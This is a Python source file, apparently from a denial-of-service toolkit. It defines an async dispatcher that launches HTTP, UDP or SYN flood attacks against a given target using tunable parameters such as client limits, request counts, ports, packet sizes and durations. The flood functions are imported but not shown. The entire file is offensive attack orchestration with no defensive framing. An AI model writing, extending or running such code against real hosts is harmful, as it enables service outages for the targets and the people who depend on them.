from ..attacks.http_flood import start_http_flood
from ..attacks.udp_flood import udp_flood
from ..attacks.syn_flood import syn_flood

import trio

async def coordinate_attacks(attack_type: str, target: str, options: dict):
    if attack_type == 'http_flood':
        await start_http_flood(
            url=target,
            semaphore_limit=options['semaphore_limit'],
            client_limit=options['client_limit'],
            request_count=options['request_count']
        )
    elif attack_type == 'udp_flood':
        await udp_flood(
            target_ip=target,
            target_port=options['port'],
            message_size=options['message_size'],
            duration=options['duration']
        )
    elif attack_type == 'syn_flood':
        await syn_flood(
            target_ip=target,
            target_port=options['port'],
            duration=options['duration'],
            #message_size=options['message_size'] 
        )
    else:
        print(f'Unknown attack type: {attack_type}')
